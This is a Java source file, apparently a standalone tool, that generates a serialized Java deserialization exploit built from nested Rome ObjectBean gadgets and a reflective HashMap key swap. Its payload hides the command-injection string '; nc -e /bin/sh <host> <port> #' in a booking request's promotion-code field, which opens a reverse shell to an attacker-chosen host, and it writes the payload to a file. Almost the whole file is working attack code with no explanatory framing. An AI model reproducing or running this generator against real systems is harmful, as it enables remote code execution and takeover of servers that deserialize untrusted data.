import com.sun.syndication.feed.impl.ObjectBean;
import org.example.payload.BookingRequest;

import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Collections;
import java.util.HashMap;

public final class ModernRomePayloadGenerator {
    private ModernRomePayloadGenerator() {
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 3 || args.length > 4) {
            throw new IllegalArgumentException(
                    "Usage: ModernRomePayloadGenerator <host> <port> <output.ser> [transactionId]");
        }

        String host = requireHost(args[0]);
        String port = requirePort(args[1]);
        Path outputPath = Path.of(args[2]).toAbsolutePath().normalize();
        int transactionId = args.length == 4 ? Integer.parseInt(args[3]) : 1;

        BookingRequest bookingRequest = new BookingRequest();
        bookingRequest.setTransactionIds(Collections.singletonList(transactionId));
        bookingRequest.setPromotionCode("; nc -e /bin/sh " + host + " " + port + " #");

        ObjectBean innerObjectBean = new ObjectBean(BookingRequest.class, bookingRequest);
        ObjectBean outerObjectBean = new ObjectBean(ObjectBean.class, innerObjectBean);

        HashMap<Object, Object> payload = new HashMap<>();
        payload.put("placeholder", "value");
        replaceFirstHashMapKey(payload, outerObjectBean);

        Files.createDirectories(outputPath.getParent());
        try (ObjectOutputStream output = new ObjectOutputStream(Files.newOutputStream(outputPath))) {
            output.writeObject(payload);
        }

        System.out.println("Wrote " + outputPath);
        System.out.println("Command content: "
                + transactionId + "+; nc -e /bin/sh " + host + " " + port + " #");
    }

    private static void replaceFirstHashMapKey(HashMap<Object, Object> map, Object newKey) throws Exception {
        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(map);

        Object node = null;
        for (Object candidate : table) {
            if (candidate != null) {
                node = candidate;
                break;
            }
        }
        if (node == null) {
            throw new IllegalStateException("HashMap table was not initialized");
        }

        Field keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, newKey);
    }

    private static String requireHost(String host) {
        if (!host.matches("[A-Za-z0-9.-]+")) {
            throw new IllegalArgumentException("Host must contain only letters, numbers, dots, or hyphens");
        }
        return host;
    }

    private static String requirePort(String port) {
        int parsedPort = Integer.parseInt(port);
        if (parsedPort < 1 || parsedPort > 65535) {
            throw new IllegalArgumentException("Port must be between 1 and 65535");
        }
        return port;
    }
}
